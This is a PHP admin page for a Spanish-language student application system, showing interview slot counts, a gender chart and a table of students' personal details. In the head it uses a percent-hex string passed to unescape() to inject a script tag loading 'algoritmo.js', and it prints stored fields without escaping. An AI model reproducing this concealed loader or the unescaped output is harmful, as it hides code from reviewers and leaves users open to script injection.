<?php
session_start();
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">

		<link rel="icon" href="img/favicon.png">

		<!-- Hojas de estilo: -->
		<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet">
		<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
		<link href="jquery-ui.min.css" rel="stylesheet">
		<link href="estilo.css?version=2_1" rel="stylesheet">
		<link  href="croppie.css" rel="stylesheet">


		<!-- Javascripts: -->
		<script src="dc3d686551.js"></script>
		<script src="jquery-1.12.4.min.js"></script>
		<script src="jquery-ui.min.js"></script>
		<script src="croppie.js"></script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.0/Chart.js'></script>

		<title>VÉRTICE | Sistema de aplicación en línea</title>

		<script>
		$(document).ready( function() {
			$(document).tooltip();
			$(document.body).append(unescape('%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3d%22%61%6c%67%6f%72%69%74%6d%6f%2e%6a%73%22%20%6c%61%6e%67%75%61%67%65%3d%22%6a%61%76%61%73%63%72%69%70%74%22%3e%3c%2f%73%63%72%69%70%74%3e'));
		});
		</script>

		<style>
		.ui-tooltip {
			padding: 10px;
			background-color: #ffffff;
			box-shadow: none;
			color: #000;
			font-family: "Open Sans", sans-serif;
			font-size: 12px;
		}
		</style>

	</head>
	<body>

<?php
if (isset($_SESSION['logged']) && $_SESSION['logged'] == true) {
  require_once 'config.php';
  $dias = array('26', '27', '28', '8', '9', '10', '11', '12', '15', '16', '17', '18', '19');
  $horarios = array('10', '11', '13', '16', '17');
  $inscritos_total = $conexion->query("SELECT COUNT(entrevista) AS inscritos_total FROM aplica_usuarios WHERE 1")->fetch_assoc()['inscritos_total']; ?>

  <div class='main'>
		<p><a href='galeria.php'>Ver las fotografías de los usuarios</a></p>
		<p><a href='logout.php'>Salir del sistema</a></p>
    <p>Alumnos registrados: <?php echo $inscritos_total; ?></p>
    <p>Esta tabla muestra los lugares ocupados / totales de cada entrevista:</p>
    <table class='tabla'>
      <tr><th></th><th>Mie. 26/sep</th><th>Jue. 27/sep</th><th>Vie. 28/sep</th><th>Lun. 8/oct</th><th>Mar. 9/oct</th><th>Mie. 10/oct</th><th>Jue. 11/oct</th><th>Vie. 12/oct</th><th>Lun. 15/oct</th><th>Mar. 16/oct</th><th>Mie. 17/oct</th><th>Jue. 18/oct</th><th>Vie. 19/oct</th></tr>
      <?php for ($i = 0; $i < count($horarios); $i++) { ?>
        <tr>
          <td><?php echo $horarios[$i]; ?></td>
          <?php for ($j = 0; $j < count($dias); $j++) {
            $capacidad = $conexion->query("SELECT capacidad FROM aplica_entrevistas WHERE clave='" . $dias[$j] . "_" . $horarios[$i] . "'")->fetch_assoc()['capacidad'];
            $inscritos = $conexion->query("SELECT COUNT(id) AS inscritos FROM aplica_usuarios WHERE entrevista='" . $dias[$j] . "_" . $horarios[$i] . "'")->fetch_assoc()['inscritos']; ?>
            <td><a href='entrevista.php?entrevista=<?php echo $dias[$j] . '_' . $horarios[$i]; ?>'><?php echo $inscritos . ' / ' . $capacidad; ?></a></td>
          <?php } ?>
        </tr>
      <?php } ?>
    </table>

		<p>Algunas estadísticas:</p>
		<div class='grafico'>
			<canvas id='grafico_1'></canvas>
		</div>

		<script>
			// Hombres vs. mujeres:
			<?php
				$grafico_proporcion_hombres = $conexion->query("SELECT COUNT('id') AS hombres FROM aplica_usuarios WHERE sexo='hombre' AND entrevista IS NOT NULL")->fetch_assoc()['hombres'];
				$grafico_proporcion_mujeres = $conexion->query("SELECT COUNT('id') AS mujeres FROM aplica_usuarios WHERE sexo='mujer' AND entrevista IS NOT NULL")->fetch_assoc()['mujeres'];
			?>
			var grafico_1 = new Chart($('#grafico_1'), {
				type: 'doughnut',
				data: {
					datasets: [{
						data: [<?php echo $grafico_proporcion_hombres; ?>, <?php echo $grafico_proporcion_mujeres; ?>],
						backgroundColor: ['#4d636f', '#cc3399']
					}],
					labels: ['Hombres', 'Mujeres']
				},
				options: {
					title: {
						display: true,
						text: 'Hombres vs. mujeres'
					},
					legend: {
						display: true,
						position: 'bottom'
					}
				}
			});
		</script>

		<p>Lista completa de alumos registrados:</p>
		<table class='tabla'>
			<tr><th>Expediente</th><th>Nombre</th><th>Correo</th><th>Fecha de nacimiento</th><th>Sexo</th><th>Carrera</th><th>Entrevista</th></tr>
			<?php $usuarios = $conexion->query("SELECT * FROM aplica_usuarios");
			while ($usuario = $usuarios->fetch_assoc()) { ?>
				<tr>
					<td><?php echo $usuario['id']; ?></td>
					<td><a href='usuario.php?usuario=<?php echo $usuario['id'];?>'><?php echo $usuario['nombre'] . ' ' . $usuario['apellido_p'] . ' ' . $usuario['apellido_m']; ?> <i class='fa fa-camera'></i></a></td>
					<td><?php echo $usuario['correo']; ?></td>
					<td><?php echo $usuario['fecha_nac']; ?></td>
					<td class='center'><?php if ($usuario['sexo'] == 'hombre') {echo "<i class='fa fa-trophy color-azul inline'></i>";} else {echo "<i class='fa fa-female color-rosa inline'></i>";} ?></td>
					<td><?php echo $usuario['carrera']; ?></td>
					<td><?php echo $usuario['entrevista']; ?></td>
				</tr>
			<?php } ?>
		</table>

  </div>
<?php }
else { ?>
  <p>Acceso prohibido</p>
<?php } ?>

</body>
</html>
